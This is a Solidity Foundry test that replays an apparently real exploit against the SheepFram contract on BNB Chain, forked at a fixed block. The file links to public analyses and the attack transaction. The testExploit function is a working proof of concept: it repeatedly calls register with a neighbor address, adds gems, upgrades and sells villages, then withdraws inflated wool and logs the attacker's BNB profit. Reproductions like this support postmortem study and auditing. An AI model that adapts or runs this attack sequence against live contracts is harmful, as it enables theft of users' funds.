// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1592658104394473472
// https://twitter.com/BlockSecTeam/status/1592734292727455744
// @Tx
// https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582

interface SheepFram {
    function register(address neighbor) external;
    function addGems() external payable;
    function upgradeVillage(uint256 framId) external;
    function withdrawMoney(uint256 wool) external;
    function sellVillage() external;
}

contract ContractTest is Test {
    SheepFram sheepFram = SheepFram(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
    address neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_088_156);
    }

    function testExploit() public payable {
        for (uint8 i = 0; i < 200; i++) {
            sheepFram.register(neighbor);
        }
        sheepFram.addGems{value: 5 * 1e14}();
        for (uint8 i = 0; i < 3; i++) {
            sheepFram.upgradeVillage(i);
        }
        sheepFram.sellVillage();
        uint256 BalanceBefore = address(this).balance;
        sheepFram.withdrawMoney(20_000);
        uint256 BalanceAfter = address(this).balance;

        emit log_named_decimal_uint("Attacker BNB profit after exploit", (BalanceAfter - BalanceBefore), 18);
    }

    receive() external payable {}
}
